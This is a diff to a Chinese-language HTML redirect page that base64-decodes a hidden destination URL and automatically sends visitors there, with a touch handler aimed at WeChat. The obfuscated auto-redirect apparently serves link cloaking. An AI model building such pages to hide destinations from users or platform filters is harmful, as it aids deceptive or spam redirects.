@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>跳转页面</title>
     <style>
         * {
@@ -19,6 +19,7 @@
             align-items: center;
             background-color: #ffffff;
             font-family: Arial, sans-serif;
+            touch-action: manipulation;
         }
 
         .loading {
@@ -39,48 +40,49 @@
     <script>
         // 解密目标URL
         function decodeUrl(encodedUrl) {
-            return decodeURIComponent(encodedUrl);
+            try {
+                // 使用 encodeURIComponent + btoa 进行加密，这里解密
+                const decodedUrl = decodeURIComponent(atob(encodedUrl));
+                return decodedUrl;
+            } catch (e) {
+                console.error('解密失败:', e);
+                return window.location.href; // 返回当前页面
+            }
         }
 
-        // 统计访问量
+        // 统计访问量（可自行添加后端接口）
         function trackVisit() {
-            // 这里可以添加后端统计接口，例如发送请求到服务器
             console.log('页面访问统计成功');
+            // 可在此处添加统计代码，例如发送请求到服务器
         }
 
-        // 统计跳转量
+        // 统计跳转量（可自行添加后端接口）
         function trackJump() {
-            // 这里可以添加后端统计接口，例如发送请求到服务器
             console.log('页面跳转统计成功');
+            // 可在此处添加统计代码，例如发送请求到服务器
         }
 
-        // 自动跳转
+        // 自动跳转逻辑
         function autoJump() {
-            // 获取加密参数
-            const encryptedUrl = 'aHR0cHM6Ly92LmRvdWRpbC5jb20vaXBzN1hvY2sv'; // 已加密的目标URL
+            const encryptedUrl = 'aHR0cHM6Ly92LmRvdWRpbC5jb20vaXBzN1hvY2sv'; // 加密后的目标URL
 
             // 解密URL
-            const decodedUrl = decodeUrl(atob(encryptedUrl));
-
-            // 统计跳转
-            trackJump();
+            const decodedUrl = decodeUrl(encryptedUrl);
 
             // 跳转
             window.location.href = decodedUrl;
         }
 
-        // 监听页面加载
+        // 监听页面加载完成
         document.addEventListener('DOMContentLoaded', function() {
             // 统计访问量
             trackVisit();
 
             // 设置延迟跳转（避免页面闪现）
             setTimeout(autoJump, 1000);
-        });
 
-        // 监听点击事件（避免微信点击无反应）
-        document.addEventListener('touchstart', function() {
-            autoJump();
+            // 监听点击事件（避免微信点击无反应）
+            document.addEventListener('touchstart', autoJump, { once: true });
         });
 
         // 监听页面关闭
